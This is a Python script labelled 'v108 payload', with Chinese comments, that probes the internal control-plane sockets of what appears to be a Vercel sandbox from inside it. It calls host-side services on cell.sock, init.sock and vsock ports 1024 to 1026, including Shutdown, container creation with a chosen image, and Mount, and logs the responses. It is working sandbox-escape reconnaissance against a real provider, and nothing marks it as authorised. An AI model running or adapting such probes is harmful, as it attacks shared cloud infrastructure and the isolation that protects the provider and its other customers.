# -*- coding: utf-8 -*-
"""v108 payload: cell.sock 深挖
P1 init.sock 上 CelldService/CellsService (host side?)
P2 cell.sock 上 CellsService (RunCell/PoolCell/...)
P3 cell.sock ContainersService/Create 带参数 (image/drive_id)
P4 vsock 1024/1025/1026 Connect 探测
输出 /vercel/sandbox/v108c.out"""
import socket, struct, time, signal, json

OUT = '/vercel/sandbox/v108c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(170)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body=b'{}', t=2.5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
        log('CONN %s %s -> %s body=%r' % (sockpath.split('/')[-1], path, status, payload[:300]))
        return d
    except Exception as e:
        log('CONN %s %s EXC %s' % (sockpath.split('/')[-1], path, type(e).__name__))
        return b''


def connect_vsock(port, path, body=b'{}', t=2.0):
    try:
        s = socket.socket(40, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((2, port))
        req = ('POST %s HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 300] if hdr_end > 0 else b''
        log('CONN v%d %s -> %s body=%r' % (port, path, status, payload[:200]))
        return d
    except Exception as e:
        log('CONN v%d %s EXC %s' % (port, path, type(e).__name__))
        return b''


CELL = '/run/cell/cell.sock'
INIT = '/run/vercel/share/init.sock'

# ---------- P1 init.sock ----------
log('=== P1 init.sock ===')
CELD = 'vercel.hive.celld.api.v1.CelldService'
CELLS = 'vercel.hive.api.cells.v1.CellsService'
for svc, methods in ((CELD, ['Heartbeat', 'Configure', 'SetWorkload', 'StartContainer', 'StopContainer',
                             'WaitContainer', 'GetDriveStorageUsage', 'Shutdown']),
                     (CELLS, ['RunCell', 'PoolCell', 'StartCell', 'StopCell', 'GetCellAddress', 'IsCellAlive'])):
    for m in methods:
        connect_unix(INIT, '/%s/%s' % (svc, m))

# ---------- P2 cell.sock CellsService ----------
log('=== P2 cell.sock cells svc ===')
for m in ('RunCell', 'PoolCell', 'StartCell', 'StopCell', 'GetCellAddress', 'IsCellAlive', 'ExtendExecutionTimeout'):
    connect_unix(CELL, '/%s/%s' % (CELLS, m))

# ---------- P3 Create 参数探测 ----------
log('=== P3 create params ===')
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Create',
             json.dumps({'image': IMG}).encode())
connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Create',
             json.dumps({'drive_id': 'v108test'}).encode())
connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Create',
             json.dumps({'image': 'alpine'}).encode())
# 空对象 + null
connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Create', b'{}')
connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Create', b'null')

# ---------- P4 vsock 1024/1025/1026 ----------
log('=== P4 vsock ports ===')
for port in (1024, 1025, 1026):
    for svc, m in ((CELD, 'Heartbeat'), ('vercel.hive.cell.api.containers.v1.ContainersService', 'Mount'),
                   ('vercel.hive.cell.api.usage.v1.UsageService', 'GetResourceUsage')):
        connect_vsock(port, '/%s/%s' % (svc, m))

# ---------- P5 GetResourceUsage 详细 ----------
log('=== P5 usage detail ===')
connect_unix(CELL, '/vercel.hive.cell.api.usage.v1.UsageService/GetResourceUsage', b'{}')
connect_unix(CELL, '/vercel.hive.cell.api.usage.v1.UsageService/GetResourceUsage', b'null')
# 其他可能方法
for m in ('List', 'Report', 'Get', 'GetUsage', 'GetCurrentUsage', 'Reset'):
    connect_unix(CELL, '/vercel.hive.cell.api.usage.v1.UsageService/%s' % m)

# ---------- P6 Mount 详细 (200 OK 之谜) ----------
log('=== P6 mount detail ===')
connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Mount', b'{}')
connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Mount', b'null')
connect_unix(CELL, '/vercel.hive.cell.api.containers.v1.ContainersService/Mount',
             json.dumps({'container_id': 'x'}).encode())

log('V108C_DONE')
f.close()
